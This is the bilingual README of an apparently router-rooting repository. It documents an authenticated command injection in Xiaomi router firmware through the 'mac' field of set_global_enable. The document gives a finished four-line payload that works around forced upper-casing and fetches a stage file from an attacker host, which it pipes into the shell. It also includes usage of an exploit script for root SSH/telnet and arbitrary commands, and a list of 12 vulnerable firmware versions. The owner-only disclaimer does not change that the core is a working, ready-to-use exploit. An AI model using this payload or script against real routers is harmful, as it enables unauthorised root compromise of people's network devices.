# `set_global_enable` — 第二条链（独立文档）

**小米路由器 `api/device_security/local_access/set_global_enable` 命令注入**

> **No disassembly · No UART · No downgrade · No xmir-patcher**
> **无需拆机 · 无需串口 · 无需降级 · 不依赖 xmir-patcher**

本仓库有**两条互不相干的链**，各自一份文档：

| 链 | 下游 | 汇聚点 | 文档 |
|---|---|---|---|
| `api/xqsystem/set_macfilter_rules` | `XQFirewall.setMacFilter` | `/usr/sbin/macfilter add black ... rulename=` | **[README.md](README.md)** |
| `api/device_security/local_access/set_global_enable` | `xqsystem._setMacFilter` | `milog.sh -m '{"tag":"sec_nic_internet",...}'` | **本文** |

RP01 两条都通。某条打不通时，换另一条试试。

<a id="top"></a>

**🌐 Language / 语言：** [**简体中文**](#zh) · [**English**](#en)

---

<a id="zh"></a>

## 🇨🇳 简体中文

### 目录

- [0. 一句话](#0-一句话)
- [1. 原理：调用链](#1-原理调用链)
- [2. 三个必须绕开的坑](#2-三个必须绕开的坑)
- [3. 最终载荷](#3-最终载荷)
- [4. 适用范围：60 份官方固件普查结果](#4-适用范围60-份官方固件普查结果)
- [5. 用法](#5-用法)
- [6. 排错](#6-排错)
- [免责声明](#免责声明)

---

### 0. 一句话

已登录 admin 会话的攻击者，可以把任意 shell 命令塞进 `mac` 参数，
以 **root** 执行 —— 用它启动 dropbear 即可拿到 SSH root。

同一台机器上**还有第二个注入点**，和 README 里 4.1 那条不是一回事，但同样能拿到 root。
它的适用范围比 `set_macfilter_rules` 广得多（见 §4）。

---

### 1. 原理：调用链

```
POST /cgi-bin/luci/;stok=<TOKEN>/api/device_security/local_access/set_global_enable
     mac=<载荷>&enable=1
  │
  ├─ 控制器调 luci.http.formvalue() 时【不传参数名】→ 拿到整张参数表
  │     ⇒ XQParam / hackCheck / macaddr 三道校验压根没被触发
  │
  ├─ index.lua#26: mac = mac:upper()          ← 载荷会被整体转成大写
  │
  ├─ require("luci.controller.api.xqsystem")._setMacFilter(mac, ...)
  │
  └─ os.execute(string.format(
         "milog.sh -m '{\"tag\":\"sec_nic_internet\",\"mac\":\"%s\",\"restricted\":%s}'",
         mac, restricted))
        ↑ 无转义，以 root 执行；返回值被丢弃，所以 {"code":0} 不代表执行成功
```

服务端唯一的校验是 `type(mac) == "string"`。

---

### 2. 三个必须绕开的坑

| 坑 | 说明 | 怎么绕 |
|---|---|---|
| 分隔符 | `urldecode_params` 用 `gmatch(body,"[^&;]+")` 切参数，`;` 和 `&` 到不了 `mac` | 用 **`|`（%7C）** 或**换行（%0A）** |
| 全大写 | `mac:upper()` 会把载荷整体大写，`curl` 变 `CURL` → not found | 载荷里**不写任何小写字母**：命令名靠 glob 展开，执行靠 `.` 内建（纯标点） |
| glob 首词 | 展开结果是排序后的词列表，**只有第一个词当命令**；从 `/` 枚举会被 `/dev/pts/ptmx` 抢走（`dev < usr`，且 `[!d]` 会被 upper 成 `[!D]` 失效） | 不从 `/` 枚举，用 **`$PATH` 锚点**让 shell 自己取目录 |

---

### 3. 最终载荷

4 行，行间是真实换行：

```sh
x' #                                             # 闭合模板单引号；首行不能用 |
A=${PATH#*:}                                     # 剥掉 PATH 第 1 段
C=${A%%:*}                                       # 取第 2 段 -> /usr/bin
$C/???? HTTP://<ATT>/S| . /[!0-9][!0-9][!0-9][!0-9]/[!0-9][!0-9][!0-9][!0-9]/??/0 #
#        ↑ 展开首词=curl   ↑ 大写 scheme（curl 的 scheme 比较大小写不敏感）
#                             ↑ stdout 经管道喂给 `.` 内建；[!0-9] 排除数字 PID 目录
```

全程**不落盘**（`curl stdout → 管道 → /proc/self/fd/0 → .`），且整串不含小写字母。

> 为什么末尾注释必须用 `#` 而不是 `|`：首行若用 `|` 收尾，整段会被拖进 pipeline
> 的子 shell，`A=` / `C=` 的赋值全部丢失。

`$PATH` 第 2 段恒为 `/usr/bin`：
`lib/preinit/00_preinit.conf` 的 `pi_init_path` 与 `/etc/profile:12` 两处一致，
QEMU 仿真实测 `echo $PATH` → `/usr/sbin:/usr/bin:/sbin:/bin` 吻合。

---

### 4. 适用范围：60 份官方固件普查结果

对小米官方 ROM 仓库的 **60 份固件**做了静态普查（解包 → 抽 `usr/lib/lua/` →
对 Fate/Z 加密的 Lua 解密后匹配字符串常量），判据是三要素齐备：

- **A** 注册了 `device_security` 的 `local_access/set_global_enable` 路由
- **B** handler 里对 `mac` 调了 `upper()`
- **C** `xqsystem.lua` 里有 `milog.sh -m '{"tag":"sec_nic_internet","mac":"%s",...}'`

**结果：只有 12 份命中（20%），不是所有机型都有。**

| 型号 | 版本 | 产品 |
|---|---|---|
| RP01 | 1.0.67 | 全屋路由 BE3600 Pro 网线版 主路由（5 口） |
| RP02 | 1.0.46 | 全屋路由 BE3600 Pro 网线版 主路由（8 口） |
| **RP03** | 1.0.63 | 全屋路由 BE3600 Pro 网线版 子路由 |
| RP04 | 1.0.89 | 路由器 BE10000 Pro |
| RP09 | 1.0.44 | 路由器 BE7200 Pro |
| RN01 | 1.0.74 | 全屋路由 BE3600 Pro |
| RN02 | 1.0.64 | 路由器 BE6500 |
| RN04 | 1.0.94 | 全屋路由 BE3600 Pro 套装 |
| RD01 | 1.0.52 | 全屋路由 |
| RD02 | 1.0.39 | 全屋路由 子路由 |
| RD03V2 | 2.0.12 | 路由器 AX3000T（新版） |
| RD08 | 1.1.96 | 路由器 6500 Pro |

12 份的**汇聚点格式串逐字节相同** ⇒ 同一个 payload 换 IP 即可，不用改。

三点要注意：

1. **按固件分支而不是按型号**：`RD03`(1.0.64) 没有 `device_security` 模块不命中，
   而 `RD03V2`(2.0.12) 命中。
2. **RD15 / RD16 / RD18（BE3600 / BE5000）只有汇聚点没有路由** —— `milog.sh` 那段
   模板躺在 `xqsystem.lua` 里，但没有任何控制器注册通向它的路由，是死代码。
3. **有安全中心 ≠ 有这个漏洞**：RC01 / RC06 有 `sec_center`、`anti_attack`，
   唯独没有 `device_security`。

普查里 3 份（R1DSTA / R2DDEV / R2DSTA）因 Broadcom TRX 容器无法定位 rootfs，
**未验证**（不等于安全）；R3DEV / R3STA 用 UBIFS 单独扫描后确认阴性。

> 普查方法可信度：每份都检查阳性对照（`xiaoqiang` + `luci` 是否出现），
> 55 份全部命中，证明"抽取 + 解密"链路正常 —— 40 份阴性不是假阴性。

---

### 5. 用法

```bash
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password 你的WEB密码
# 其它用法
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password 你的WEB密码 --cmd 'id'
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password 你的WEB密码 --telnet
```

| 参数 | 说明 |
|---|---|
| `--ip` | 路由器地址，可带端口 |
| `--password` | WEB 管理密码；不填会交互式询问（没设过就回车） |
| `--cmd` | 执行任意命令（多条用 `;` 或换行分隔） |
| `--telnet` | 起 telnetd(23)，免密 root shell |
| `--lhost` / `--lport` | 本机可被路由器访问的 IP 与 HTTP 端口（默认自动探测 / 8000） |
| `--wait` | 等待回连秒数，默认 12 |
| `--keep` | 结束后保留 stage 文件 `S` |

脚本流程：登录 → 在同目录写 stage `S` → 起 HTTP 服务 → 注入 →
回读日志 → 探端口 → 清理。

> 这条链的接口 `sysauth = "admin"`，**必须登录**，因此没有 `--no-auth` 这个选项
> （本仓库把"必须提供 WEB 密码"当作授权门槛刻意保留）。
> 判定成功看脚本打印的 HTTP 日志里有没有 `GET /S`（`{"code":0}` 不代表成功）。

拿 shell 之后，`/etc` 是内存文件系统、重启即丢，需要持久化请看
[README.md §3.4](README.md#34-持久化重启后还能进来)；root 密码用
`tools/calc_root_pwd.py <SN>` 算。

---

### 6. 排错

| 现象 | 原因 | 处理 |
|---|---|---|
| HTTP 日志没有 `GET /S` | `$PATH` 第 2 段不是 `/usr/bin`，或 curl 没被定位到 | 在设备 shell 上确认 `echo $PATH` 与 `A=${PATH#*:}; C=${A%%:*}; echo $C/????` |
| 有 `GET /S` 但 22 没开 | dropbear 启动失败 | 看 `/etc/dropbear` 权限、22 是否被占用 |
| 日志完全为空、路由器连不上我 | **Windows 防火墙**拦了入站，或 `--lhost` 猜错网卡 | 放行端口；用 `--lhost <本机局域网IP>` 显式指定，先自测 `curl http://<lhost>:<lport>/S` |
| `401` / 302 到登录页 | stok 失效 | 重新登录 |
| 脚本打印 `[~] ...22 开放，但注入前就是开的` | 探的是本机/仿真侧的 22 | 忽略端口结论，**以 HTTP 日志有无 `GET /S` 为准** |
| 响应是 `{"code":0}` 但什么都没发生 | `os.execute` 返回值被丢弃，响应体恒为 0 | 一律看 HTTP 日志 / 端口 |

---

### 免责声明

> **前提：你必须是该设备的所有者。** 本脚本必须提供设备的 WEB 管理密码，
> 这本身就是一道授权门槛；这也是它**没有** `--no-auth` 选项的原因。

- 仅适用于**你自己拥有**的设备
- 可能导致**失去官方保修**
- 操作不当有**变砖**风险（建议先按 README §3.5 备份 flash）
- 作者不对任何设备损坏、数据丢失负责

**请勿对不属于你的设备使用。** 在中国大陆，未经授权侵入他人计算机信息系统可能触犯
《刑法》第 285 条。本仓库只分发分析方法与自己编写的脚本，不含任何小米固件二进制文件。

**↑ [回到语言选择 / Back to language selector](#top)**

---

<a id="en"></a>

## 🇬🇧 English

### Table of Contents

- [0. TL;DR](#0-tldr)
- [1. Call chain](#1-call-chain)
- [2. Three traps](#2-three-traps)
- [3. Final payload](#3-final-payload)
- [4. Scope: 60-firmware census](#4-scope-60-firmware-census)
- [5. Usage](#5-usage)
- [6. Troubleshooting](#6-troubleshooting)
- [Disclaimer](#disclaimer)
- [回到顶部 / Back to top](#top)

---

### 0. TL;DR

An attacker with an **authenticated admin session** can smuggle arbitrary shell
commands through the `mac` parameter and have them run as **root** — start dropbear
and you get an SSH root shell.

This is a **second, distinct injection point** from the one documented in
[README.md](README.md); its scope is considerably wider (see §4).

---

### 1. Call chain

```
POST /cgi-bin/luci/;stok=<TOKEN>/api/device_security/local_access/set_global_enable
     mac=<payload>&enable=1
  │
  ├─ the handler calls luci.http.formvalue() with NO argument → gets the whole
  │    params table ⇒ XQParam / hackCheck / macaddr are never triggered
  │
  ├─ index.lua#26: mac = mac:upper()          ← the payload is upper-cased
  │
  ├─ require("luci.controller.api.xqsystem")._setMacFilter(mac, ...)
  │
  └─ os.execute(string.format(
         "milog.sh -m '{\"tag\":\"sec_nic_internet\",\"mac\":\"%s\",\"restricted\":%s}'",
         mac, restricted))
        ↑ unescaped, runs as root. The return value is discarded,
          so {"code":0} does NOT mean it worked
```

The only server-side check is `type(mac) == "string"`.

---

### 2. Three traps

| Trap | Why | Workaround |
|---|---|---|
| Separators | `urldecode_params` splits on `[^&;]+`, so `;` and `&` never reach `mac` | use **`|`** or **newline** |
| Upper-casing | `mac:upper()` turns `curl` into `CURL` → not found | write **no lowercase letter at all**: get the command name via globbing, execute via the `.` builtin |
| Glob first word | expansion yields a sorted word list and **only the first word becomes the command**; enumerating from `/` loses to `/dev/pts/ptmx` (`dev < usr`, and `[!d]` becomes `[!D]` after upper-casing) | don't enumerate `/` — anchor on **`$PATH`** and let the shell pick the directory |

---

### 3. Final payload

Four lines, real newlines:

```sh
x' #                                          # close the template quote; no `|` here
A=${PATH#*:}                                  # drop the 1st PATH segment
C=${A%%:*}                                    # take the 2nd -> /usr/bin
$C/???? HTTP://<ATT>/S| . /[!0-9][!0-9][!0-9][!0-9]/[!0-9][!0-9][!0-9][!0-9]/??/0 #
```

Nothing is written to disk (`curl stdout → pipe → /proc/self/fd/0 → .`),
and the whole string contains no lowercase letter.

> The line must be terminated with `#`, not `|`: a trailing `|` on line 1 drags the
> whole block into a pipeline sub-shell and the `A=` / `C=` assignments are lost.

The 2nd `$PATH` segment is always `/usr/bin` — `pi_init_path` in
`lib/preinit/00_preinit.conf` and `/etc/profile:12` agree, and QEMU emulation
confirms `echo $PATH` → `/usr/sbin:/usr/bin:/sbin:/bin`.

---

### 4. Scope: 60-firmware census

We statically audited **60 official Xiaomi firmware images** (unpack → extract
`usr/lib/lua/` → decrypt the Fate/Z-protected Lua → match string constants).
A device counts as vulnerable only when all three are present:

- **A** the `device_security` controller registers `local_access/set_global_enable`
- **B** the handler calls `upper()` on `mac`
- **C** `xqsystem.lua` holds `milog.sh -m '{"tag":"sec_nic_internet","mac":"%s",...}'`

**Result: 12 of 60 (20%). Not every model is affected.**

| Model | Version | Product |
|---|---|---|
| RP01 | 1.0.67 | BE3600 Pro (wired) main unit, 5-port |
| RP02 | 1.0.46 | BE3600 Pro (wired) main unit, 8-port |
| **RP03** | 1.0.63 | BE3600 Pro (wired) satellite unit |
| RP04 | 1.0.89 | BE10000 Pro |
| RP09 | 1.0.44 | BE7200 Pro |
| RN01 | 1.0.74 | BE3600 Pro |
| RN02 | 1.0.64 | BE6500 |
| RN04 | 1.0.94 | BE3600 Pro (pack) |
| RD01 | 1.0.52 | Whole-home mesh |
| RD02 | 1.0.39 | Whole-home mesh satellite |
| RD03V2 | 2.0.12 | AX3000T (new revision) |
| RD08 | 1.1.96 | 6500 Pro |

The sink format string is **byte-identical** across all 12 ⇒ one payload fits all,
just swap the IP.

Three caveats:

1. **It depends on the firmware branch, not the model.** `RD03`(1.0.64) lacks the
   `device_security` module and is not affected; `RD03V2`(2.0.12) is.
2. **RD15 / RD16 / RD18 have the sink but no route** — the `milog.sh` template sits
   in `xqsystem.lua` as dead code.
3. **Having a security center ≠ being vulnerable**: RC01 / RC06 ship `sec_center`
   and `anti_attack` but no `device_security`.

3 images (R1DSTA / R2DDEV / R2DSTA) could not be unpacked (Broadcom TRX container)
and are therefore **unverified, not proven safe**; R3DEV / R3STA were scanned
separately (UBIFS) and came back negative.

> Census credibility: every image was checked against a positive control
> (do `xiaoqiang` and `luci` appear?). All 55 parseable images passed, proving the
> extract+decrypt pipeline works — the 40 negatives are not false negatives.

---

### 5. Usage

```bash
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password <WEB-PASSWORD>
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password <WEB-PASSWORD> --cmd 'id'
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password <WEB-PASSWORD> --telnet
```

| Option | Meaning |
|---|---|
| `--ip` | Router address, may include a port |
| `--password` | WEB admin password; prompted if omitted (just press Enter if never set) |
| `--cmd` | Run an arbitrary command (separate several with `;` or newlines) |
| `--telnet` | Start telnetd(23) — passwordless root shell |
| `--lhost` / `--lport` | Your IP as reachable from the router, and the HTTP port (auto-detected / 8000) |
| `--wait` | Seconds to wait for the callback (default 12) |
| `--keep` | Keep the stage file `S` when done |

Flow: log in → write the stage file `S` next to the script → serve it over HTTP →
inject → read the log back → probe the port → clean up.

> This route has `sysauth = "admin"` — it **requires a login**, so the script has
> no `--no-auth` option at all (requiring the WEB password is a deliberate
> authorization gate). Judge success by whether the script's HTTP log shows
> `GET /S`; `{"code":0}` means nothing.

`/etc` is a RAM filesystem and does not survive a reboot — see
[README.md §3.4](README.md#34-persistence-surviving-reboots) for persistence.
The root password comes from `tools/calc_root_pwd.py <SN>`.

---

### 6. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| No `GET /S` in the HTTP log | the 2nd `$PATH` segment isn't `/usr/bin`, or curl wasn't located | on a device shell, check `echo $PATH` and `A=${PATH#*:}; C=${A%%:*}; echo $C/????` |
| `GET /S` present but port 22 closed | dropbear failed to start | check `/etc/dropbear` permissions, or whether 22 is already taken |
| Log empty, router can't reach me | the **Windows firewall** blocked inbound, or `--lhost` guessed the wrong NIC | open the port; pass `--lhost <your LAN IP>` and self-test with `curl http://<lhost>:<lport>/S` |
| `401` / 302 to the login page | stok expired | log in again |
| `[~] ...22 open, but it was already open before` | the probe hit your own/simulated port 22 | ignore the port verdict; go by `GET /S` |
| `{"code":0}` but nothing happened | the `os.execute` return value is discarded | always check the HTTP log / the port |

---

### Disclaimer

> **You must own the device.** The script requires the WEB admin password, which is
> itself an authorization gate — and the reason it has **no** `--no-auth` option.

- For use on **devices you own**, only
- May **void the official warranty**
- **Bricking** is possible if you improvise (back up the flash first, README §3.5)
- The author is not responsible for any damage or data loss

**Do not use this on devices you do not own.** In mainland China, unauthorised
access to someone else's computer information system may violate Article 285 of the
Criminal Law. This repository distributes analysis methods and self-written scripts
only — no Xiaomi firmware binaries.

**↑ [Back to language selector](#top)**
